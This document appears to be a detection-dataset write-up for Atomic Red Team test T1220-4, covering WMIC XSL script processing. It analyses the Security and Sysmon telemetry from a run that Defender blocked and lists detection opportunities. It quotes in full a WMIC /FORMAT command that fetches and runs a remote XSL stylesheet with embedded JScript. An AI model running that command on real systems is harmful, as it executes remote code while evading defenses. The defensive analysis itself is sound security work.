# T1220-4: XSL Script Processing — WMIC bypass using remote XSL file

## Technique Context

T1220 XSL Script Processing is a defense evasion technique where adversaries execute code by transforming XML using XSL stylesheets. The technique leverages Windows utilities like WMIC, msxsl.exe, or Internet Explorer to process XSL files that contain embedded script blocks. This particular test (T1220-4) demonstrates using WMIC's `/FORMAT` parameter to retrieve and execute a remote XSL stylesheet containing malicious JScript code.

The detection community focuses on monitoring WMIC usage with the `/FORMAT` parameter, particularly when pointing to remote URLs, as this is a well-documented abuse vector. Defenders also watch for unusual process spawning patterns from WMIC and network connections to retrieve remote XSL files. This technique is attractive to attackers because it abuses legitimate Windows functionality and can appear as routine system administration activity.

## What This Dataset Contains

The dataset captures Windows Defender blocking the XSL execution attempt, producing valuable attempt telemetry. The Security channel shows the complete process chain in Security 4688 events: PowerShell spawns `cmd.exe /c wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"`, which then spawns `wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"`.

The critical evidence is in the WMIC process exit event (Security 4689) showing exit code `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution. Sysmon EID 1 events capture both the cmd.exe and the WMIC process creation with full command lines showing the remote XSL URL. Sysmon EID 7 events show PowerShell loading urlmon.dll, which would handle the HTTP request to fetch the remote XSL file.

Process access events (Sysmon EID 10) show PowerShell accessing both whoami.exe and cmd.exe processes, indicating the test framework monitoring the spawned processes. A CreateRemoteThread event (Sysmon EID 8) shows cmd.exe creating a thread in an unknown process, which may be part of Defender's blocking mechanism.

## What This Dataset Does Not Contain

The dataset lacks the successful XSL execution telemetry because Defender blocked it. Missing are network connection events showing the HTTP request to github.com to fetch the XSL file, the actual XSL file content or download, and any JScript execution that would have occurred within the WMIC process. The Sysmon ProcessCreate events for WMIC are missing from the Sysmon data (only present in Security) because the sysmon-modular config uses include-mode filtering and WMIC isn't in the monitored process list.

There are no DNS queries captured for the github.com resolution, no file write events for any cached XSL content, and no child processes that would have been spawned by successful JScript execution. The PowerShell events contain only test framework boilerplate (Set-ExecutionPolicy calls) rather than the actual test execution code.

## Assessment

This dataset provides excellent detection value for identifying attempted XSL-based defense evasion, even when blocked by endpoint protection. The Security 4688/4689 events with command-line logging capture the full attack pattern and the blocking action. The combination of suspicious command lines, remote URL references, and access denied exit codes creates a high-fidelity detection signature.

The data demonstrates how modern endpoint protection creates valuable "attempt telemetry" that defenders can use to identify attack patterns even when the malicious activity is prevented. The complete process ancestry from PowerShell through cmd.exe to WMIC with the remote XSL URL provides clear attribution and context for investigation.

## Detection Opportunities Present in This Data

1. **WMIC Remote XSL Detection**: Alert on Security 4688 events where WMIC command line contains `/FORMAT:` parameter with HTTP/HTTPS URLs, especially from non-administrative contexts.

2. **XSL Execution Blocking**: Monitor Security 4689 events for WMIC processes exiting with code 0xC0000022 combined with command lines containing `/FORMAT:` parameters.

3. **Suspicious Command Chain**: Detect PowerShell spawning cmd.exe which spawns WMIC with remote URL format parameters within short time windows.

4. **URL Pattern Matching**: Flag WMIC command lines containing GitHub raw content URLs or other known XSL hosting patterns commonly used in attack frameworks.

5. **Process Access Anomalies**: Correlate Sysmon EID 10 events showing PowerShell accessing multiple child processes with WMIC format commands to identify test frameworks or automation tools.

6. **XSL File Extension Monitoring**: Watch for network requests to URLs ending in .xsl from system processes, particularly when combined with WMIC execution.
